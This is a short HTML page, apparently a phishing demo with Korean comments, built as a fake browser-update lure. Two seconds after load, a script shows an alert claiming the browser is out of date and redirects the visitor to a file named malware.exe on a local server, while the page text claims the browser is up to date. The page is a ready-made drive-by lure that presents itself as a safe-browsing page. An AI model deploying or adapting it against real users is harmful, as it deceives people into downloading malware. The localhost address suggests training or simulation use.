<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Browser Update</title>
    <script>
        function fakeUpdate() {
            alert("Your browser is out of date! Please update now.");
            window.location.href = "http://127.0.0.1:5000/malware.exe";  // 가짜 업데이트 다운로드
        }

        setTimeout(fakeUpdate, 2000); // 2초 후 실행
    </script>
</head>
<body>
    <h1>Welcome to Safe Browsing</h1>
    <p>Your browser is up-to-date.</p>
</body>
</html>
